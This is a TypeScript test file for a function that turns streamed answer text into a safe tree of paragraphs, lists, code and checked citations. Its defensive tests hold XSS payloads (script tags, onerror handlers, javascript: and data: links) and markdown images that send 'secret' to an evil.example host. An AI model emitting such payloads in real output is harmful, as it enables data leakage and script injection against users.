import { describe, expect, it } from "vitest";

import { MAX_ANSWER_CHARS, sanitizeAnswer, type Block, type Inline } from "./answer";

const VALID = new Set([1, 2, 3]);
const parse = (text: string, valid: ReadonlySet<number> = VALID) => sanitizeAnswer(text, valid);

/** Plain-text projection: what a reader would see, with `[n]` for citations. */
function plain(blocks: readonly Block[]): string {
  const inline = (nodes: readonly Inline[]): string =>
    nodes
      .map((n) => {
        switch (n.type) {
          case "text":
          case "code":
            return n.text;
          case "cite":
            return `[${n.n}]`;
          default:
            return inline(n.children);
        }
      })
      .join("");
  return blocks
    .map((b) =>
      b.type === "paragraph"
        ? inline(b.children)
        : b.type === "list"
          ? b.items.map((i) => `- ${inline(i)}`).join("\n")
          : `\`\`\`\n${b.text}\n\`\`\``,
    )
    .join("\n\n");
}

const INLINE_TYPES = new Set(["text", "strong", "em", "code", "cite"]);

/** Every node is one of the safe types, and citations are valid. No other shape can exist. */
function assertSafe(blocks: readonly Block[], valid: ReadonlySet<number> = VALID): void {
  const walk = (nodes: readonly Inline[]) => {
    for (const n of nodes) {
      expect(INLINE_TYPES.has(n.type)).toBe(true);
      expect(Object.keys(n).sort()).toEqual(
        n.type === "strong" || n.type === "em"
          ? ["children", "type"]
          : n.type === "cite"
            ? ["n", "type"]
            : ["text", "type"],
      );
      if (n.type === "cite") expect(valid.has(n.n)).toBe(true);
      if (n.type === "strong" || n.type === "em") walk(n.children);
    }
  };
  for (const b of blocks) {
    expect(["paragraph", "list", "code"]).toContain(b.type);
    if (b.type === "paragraph") walk(b.children);
    if (b.type === "list") for (const item of b.items) walk(item);
  }
}

describe("sanitizeAnswer: formatting", () => {
  it("parses paragraphs, emphasis, inline code and lists", () => {
    const blocks = parse(
      "First **bold** and *italic* and `code`.\nSame paragraph.\n\nSecond paragraph.\n\n- one\n- two\n\n1. a\n2. b",
    );
    expect(blocks).toEqual([
      {
        type: "paragraph",
        children: [
          { type: "text", text: "First " },
          { type: "strong", children: [{ type: "text", text: "bold" }] },
          { type: "text", text: " and " },
          { type: "em", children: [{ type: "text", text: "italic" }] },
          { type: "text", text: " and " },
          { type: "code", text: "code" },
          { type: "text", text: ". Same paragraph." },
        ],
      },
      { type: "paragraph", children: [{ type: "text", text: "Second paragraph." }] },
      {
        type: "list",
        ordered: false,
        items: [[{ type: "text", text: "one" }], [{ type: "text", text: "two" }]],
      },
      {
        type: "list",
        ordered: true,
        items: [[{ type: "text", text: "a" }], [{ type: "text", text: "b" }]],
      },
    ]);
  });

  it("flattens headings to bold paragraphs and drops rules and quote markers", () => {
    expect(plain(parse("# Title\n\n---\n\n> quoted"))).toBe("Title\n\nquoted");
    const [heading] = parse("## Steps");
    expect(heading).toEqual({
      type: "paragraph",
      children: [{ type: "strong", children: [{ type: "text", text: "Steps" }] }],
    });
  });

  it("flattens nested lists and joins continuation lines", () => {
    const [list] = parse("- a\n  - nested\n- b\n  continued");
    expect(list).toMatchObject({ type: "list", ordered: false });
    expect(plain([list!])).toBe("- a\n- nested\n- b continued");
  });

  it("keeps fenced code verbatim, with a safe language label", () => {
    const blocks = parse("Run:\n\n```bash\nnpm run **x** [1]\n# not a heading\n```\n\nDone.");
    expect(blocks[1]).toEqual({
      type: "code",
      language: "bash",
      text: "npm run **x** [1]\n# not a heading",
    });
    expect(parse("```<script>\nx\n```")[0]).toMatchObject({ language: null });
    expect(parse("~~~\nx\n~~~")[0]).toMatchObject({ type: "code", language: null, text: "x" });
  });

  it("treats markdown inside code as text", () => {
    const blocks = parse("Use `**not bold** [1] ![i](http://x)` here");
    expect(blocks[0]).toMatchObject({ type: "paragraph" });
    const code = (blocks[0] as Extract<Block, { type: "paragraph" }>).children.find(
      (n) => n.type === "code",
    );
    expect(code).toEqual({ type: "code", text: "**not bold** [1] ![i](http://x)" });
  });

  it("does not turn snake_case or a lone star into emphasis", () => {
    expect(plain(parse("use my_variable_name and 2 * 3 * 4"))).toBe(
      "use my_variable_name and 2 * 3 * 4",
    );
  });

  it("honours backslash escapes", () => {
    expect(plain(parse("\\*literal\\* and \\[1\\]"))).toBe("*literal* and [1]");
  });
});

describe("sanitizeAnswer: unsafe content", () => {
  it("drops images, even with external URLs, keeping at most the alt text", () => {
    const blocks = parse("Before ![diagram](https://evil.example/leak?q=secret) after");
    expect(plain(blocks)).toBe("Before diagram after");
    expect(JSON.stringify(blocks)).not.toContain("evil.example");
    assertSafe(blocks);
    expect(plain(parse("![](https://evil.example/x.png)"))).toBe("");
    expect(plain(parse("![a [nested] b](https://evil.example/x)"))).toBe("a nested b");
  });

  it("turns every link into text: the label, then the address as plain text", () => {
    const blocks = parse("See [the docs](https://example.com/a?b=1) now");
    expect(plain(blocks)).toBe("See the docs (https://example.com/a?b=1) now");
    expect(JSON.stringify(blocks)).not.toMatch(/"(href|src|url|link)"/);
    assertSafe(blocks);
  });

  it("does not make javascript: or data: links, or autolinks, clickable", () => {
    for (const input of [
      "[x](javascript:alert(1))",
      "[x](JaVaScRiPt:alert(1))",
      "[x](data:text/html;base64,PHNjcmlwdD4=)",
      "[x](vbscript:msgbox)",
      "<https://evil.example/steal>",
      "https://evil.example/plain",
      "[ref]: https://evil.example",
    ]) {
      const blocks = parse(input);
      assertSafe(blocks);
      // Only text nodes exist, so there is nothing a component could turn into an anchor.
      expect(JSON.stringify(blocks)).not.toMatch(/"type":"(link|image|html)"/);
    }
    expect(plain(parse("[x](javascript:alert(1))"))).toBe("x (javascript:alert(1))");
  });

  it("keeps HTML and event handlers as inert text", () => {
    const input =
      '<script>alert(1)</script> <img src=x onerror=alert(1)> <a href="javascript:x">y</a>';
    const blocks = parse(input);
    assertSafe(blocks);
    expect(plain(blocks)).toBe(input);
    for (const block of blocks) expect(block.type).toBe("paragraph");
  });

  it("neutralises control and bidi characters in a shown URL", () => {
    const text = plain(parse("[a](https://x.example/‮evil\u0000)"));
    expect(text).not.toMatch(/[‮\u0000]/);
  });

  it("closes nothing dangerous for unbalanced markers", () => {
    for (const input of [
      "**bold",
      "*em",
      "_em",
      "`code",
      "``code`",
      "[label](url",
      "[label]",
      "![alt](",
      "***x",
      "**a*",
      "a ** b ** c",
      "[1",
      "[1,",
    ]) {
      const blocks = parse(input);
      assertSafe(blocks);
      expect(plain(blocks).length).toBeGreaterThan(0);
    }
    expect(plain(parse("**bold"))).toBe("**bold");
    expect(plain(parse("`code"))).toBe("`code");
  });
});

describe("sanitizeAnswer: citations", () => {
  it("keeps valid markers and removes invalid ones", () => {
    expect(plain(parse("Rotate it [1]. Also [99] and [2]."))).toBe("Rotate it [1]. Also and [2].");
    const blocks = parse("A [1][3] B [0] C [4]");
    assertSafe(blocks);
    expect(plain(blocks)).toBe("A [1][3] B C");
  });

  it("handles comma lists, keeping only the valid numbers", () => {
    expect(plain(parse("x [1, 2, 9]"))).toBe("x [1][2]");
    expect(plain(parse("x [8, 9]."))).toBe("x.");
  });

  it("removes every marker when there are no excerpts", () => {
    expect(plain(parse("a [1] b [2]", new Set()))).toBe("a b");
  });

  it("does not treat a marker with a URL as a citation", () => {
    expect(plain(parse("[1](https://evil.example/x)"))).toBe("1 (https://evil.example/x)");
    assertSafe(parse("[1](https://evil.example/x)"));
  });

  it("does not cite inside code", () => {
    expect(plain(parse("`[1]`"))).toBe("[1]");
    expect(parse("`[1]`")[0]).toMatchObject({
      children: [{ type: "code", text: "[1]" }],
    });
  });

  it("accepts an array of valid numbers", () => {
    expect(plain(sanitizeAnswer("[2] [5]", [2]))).toBe("[2]");
  });
});

describe("sanitizeAnswer: streaming and size", () => {
  const CORPUS = [
    "# Title",
    "",
    "Intro with **bold**, *em*, `code`, [link](https://evil.example/q?x=1) and ![img](https://evil.example/i.png) [1] [99].",
    "",
    "- item [2]",
    "- item two <script>alert(1)</script>",
    "",
    "```js",
    "const a = '**x**'; // [1]",
    "```",
    "",
    "1. one",
    "2. two",
    "",
    "> quote \\*esc\\*",
  ].join("\n");

  it("is safe and never throws for the text cut at every character boundary", () => {
    for (let i = 0; i <= CORPUS.length; i += 1) {
      const blocks = parse(CORPUS.slice(0, i));
      // An unfinished image or link shows as literal text while it streams: inert, never an element.
      assertSafe(blocks);
    }
    // Once complete, the image is gone (its URL appears nowhere).
    expect(JSON.stringify(parse(CORPUS))).not.toContain("evil.example/i.png");
    // The full text shows the same safe tree however it arrived.
    expect(parse(CORPUS)).toEqual(parse([...CORPUS].join("")));
  });

  it("shows an unfinished code fence as code so far", () => {
    expect(parse("```py\nprint(1)")[0]).toEqual({ type: "code", language: "py", text: "print(1)" });
  });

  it("handles empty input and whitespace", () => {
    expect(parse("")).toEqual([]);
    expect(parse("  \n\n \t\n")).toEqual([]);
  });

  it("parses very long and adversarial input quickly", () => {
    const cases = [
      "a".repeat(500_000),
      "*".repeat(200_000),
      "_a ".repeat(60_000),
      "`".repeat(100_000),
      "[".repeat(100_000),
      "![a](".repeat(30_000),
      "[a](".repeat(30_000),
      "*a ".repeat(40_000),
      "**_".repeat(30_000),
      "- x\n".repeat(50_000),
      "```\n".repeat(30_000),
    ];
    for (const input of cases) {
      const started = Date.now();
      const blocks = parse(input);
      assertSafe(blocks);
      expect(Date.now() - started).toBeLessThan(2000);
    }
  });

  it("ignores text beyond the maximum length", () => {
    const blocks = parse(`${"a".repeat(MAX_ANSWER_CHARS)}TAIL`);
    expect(plain(blocks)).not.toContain("TAIL");
  });
});
